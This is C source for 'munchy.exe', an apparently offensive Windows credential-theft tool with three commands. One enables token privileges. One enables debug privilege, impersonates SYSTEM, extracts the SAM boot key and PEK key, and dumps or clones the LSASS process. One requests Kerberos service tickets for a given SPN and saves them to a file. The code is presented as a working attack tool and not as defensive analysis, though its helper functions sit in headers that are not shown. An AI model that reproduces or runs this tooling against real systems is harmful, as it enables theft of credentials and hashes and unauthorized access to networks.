// #include <stdlib.h>

// #include "./include/token.c"

// #include "./include/lsass.c"
#include <lsa.h>
#include <lsass.h>
#include <token.h>

#include <argtable3.h>
#include <wincrypt.h>
#include <windows.h>
const char *banner = "_____________,-.___     _\n"
                     "|____        { {]_]_]   [_]\n"
                     "|___ `-----.__\\ \\_]_]_    . `\n"
                     "|   `-----.____} }]_]_]_   ,\n"
                     "|_____________/ {_]_]_]_] , `\n"
                     "            `-'";

struct command {
  const char *name;
  int (*handler)(int, char **);
};

int cmd_token(int argc, char *argv[]) {
  struct arg_end *end;
  struct arg_lit *help;
  struct arg_str *priv;
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      priv = arg_str1(NULL, "priv", "<value>",
                      "required privilege name without 'Se'"),
      end = arg_end(20),
  };
  int narg = sizeof(argtable) / sizeof(argtable[0]);
  int nerrors = arg_parse(argc, argv, argtable);
  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }

  if (help->count > 0) {
    printf("Usage: token");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }

  if (nerrors > 0) {
    arg_print_errors(stdout, end, "token");
    printf("Try: token --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }
  printf("priv value received: %s\n", priv->sval[0]);
  NTSTATUS status = EnablePrivilege(priv->sval[0]);
  printf("status: 0x%08lX\n", (unsigned long)status);
  return 0;
}
int cmd_lsass(int argc, char *argv[]) {

  struct arg_end *end;
  struct arg_lit *help;
  struct arg_lit *clone = arg_lit0("c", "clone", "clone lsass and dump");
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      clone,
      end = arg_end(20),
  };
  int narg = sizeof(argtable) / sizeof(argtable[0]);
  int nerrors = arg_parse(argc, argv, argtable);
  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }
  if (help->count > 0) {
    printf("Usage: lsass");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }
  if (nerrors > 0) {
    arg_print_errors(stdout, end, "token");
    printf("Try: lsass --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }

  HANDLE lsassPID = Find();
  // printf("Handle value: %p\n", lsassPID);
  EnablePrivilege("debug");
  ImpersonateSystem();
  //  NTSTATUS status = ImpersonateSystem();
  //  if (status != 0) {
  //    printf("status failed for impersonation: 0x%08lX\n", status);
  //    return 1;
  //  }

  UINT8 *bootKey = ExtractSysKey();

  ExtractPEKKey(bootKey);

  if (lsassPID != NULL) {
    if (clone->count > 0) {
      NTSTATUS status = Clone(lsassPID);
    } else {
      printf("defaulting to traditional methods...\n");
      NTSTATUS status = DumpLsa(lsassPID);
      printf("0x%08lX\n", status);
    }
  }

  return 0;
}

int cmd_lsa(int argc, char *argv[]) {
  struct arg_end *end;
  struct arg_lit *help;
  struct arg_str *spn;
  struct arg_str *user;
  struct arg_str *passwd;
  struct arg_str *outfile;
  void *argtable[] = {
      help = arg_lit0(NULL, "help", "show help"),
      spn = arg_str1(NULL, "spn", "<value>", "required spn/target service"),
      passwd = arg_str0(NULL, "passwd", "<value>", "optional password"),
      user = arg_str0(NULL, "user", "<value>", "optional username"),
      outfile = arg_str1(NULL, "outfile", "<value>",
                         "output file for ticket (required)"),
      end = arg_end(20),
  };
  int narg = sizeof(argtable) / sizeof(argtable[0]);

  if (arg_nullcheck(argtable) != 0) {
    printf("out of memory\n");
    return 1;
  }

  int nerrors = arg_parse(argc, argv, argtable);

  if (help->count > 0) {
  help_goto:
    printf("Usage: lsa");
    arg_print_syntax(stdout, argtable, "\n");
    arg_print_glossary(stdout, argtable, "  %-25s %s\n");
    arg_freetable(argtable, narg);
    return 0;
  }
  if (nerrors > 0) {
    arg_print_errors(stdout, end, "lsa");
    printf("Try: lsa --help\n");
    arg_freetable(argtable, narg);
    return 1;
  }
  if (spn->count == 0) {
    goto help_goto;
  }

  // Convert spn to wide string
  int spn_len = MultiByteToWideChar(CP_UTF8, 0, spn->sval[0], -1, NULL, 0);
  PWCHAR spn_w = (PWCHAR)LocalAlloc(LPTR, spn_len * sizeof(wchar_t));
  MultiByteToWideChar(CP_UTF8, 0, spn->sval[0], -1, spn_w, spn_len);

  NTSTATUS status =
      Kerberos_ask(spn_w, outfile->sval[0], L"default", L"default", NULL);
  if (status != 0) {
    printf("status: 0x%lX\n", status);
  }

  arg_freetable(argtable, narg);
  return status != 0 ? -1 : 0;
}

struct command cmds[] = {
    {"token", cmd_token},
    {"lsass", cmd_lsass},
    {"lsa", cmd_lsa},

};

int main(int argc, char *argv[]) {
  printf("%s\n", banner);
  if (argc < 2) {
    printf("usage: munchy.exe <command>\n");
    for (int i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
      printf("munchy.exe %s --help\n", cmds[i].name);
    }
    return 1;
  }
  const char *cmd = argv[1];
  for (int i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
    if (strcmp(cmds[i].name, cmd) == 0) {
      return cmds[i].handler(argc - 1, argv + 1);
    }
  }
  printf("Unknown command: %s\n", cmd);
  return EXIT_FAILURE;
}
